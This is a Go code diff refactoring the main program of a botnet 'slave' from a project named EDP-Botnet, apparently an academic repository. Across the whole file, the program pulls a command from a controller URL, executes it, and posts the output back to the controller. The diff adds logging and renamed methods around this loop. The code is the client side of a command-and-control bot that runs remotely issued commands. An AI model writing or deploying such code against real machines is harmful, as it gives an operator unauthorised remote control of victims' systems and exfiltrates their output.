@@ -1,13 +1,24 @@
 package main
 
-import(
-  "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
+import (
+	"log"
+	"os"
+
+	slave "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
 )
 
-func main(){
-  url := "http://localhost:5000"
-  comando := ExecutingSlave.Recv_cmd(url+"/command")
-  resp := ExecutingSlave.Exec_cmd(comando)
-  ExecutingSlave.Send_cmd(url+"/send",resp)
+func main() {
+	l := log.New(os.Stdout, "slave-logger", log.LstdFlags)
+	s := slave.NewSlave(l)
+	url := "http://localhost:5000"
+	comando := s.RecvCmd(url + "/command")
 
+	// log.Printf("Command: %#v\n", comando)
+
+	resp := s.ExecCmd(comando)
+
+	// log.Printf("Response from ExecCmd: %#v\n", resp)
+	respStatus := s.SendCmd(url+"/send", resp.Bytes())
+
+	log.Printf("Response Status from SendCmd: %#v\n", respStatus)
 }
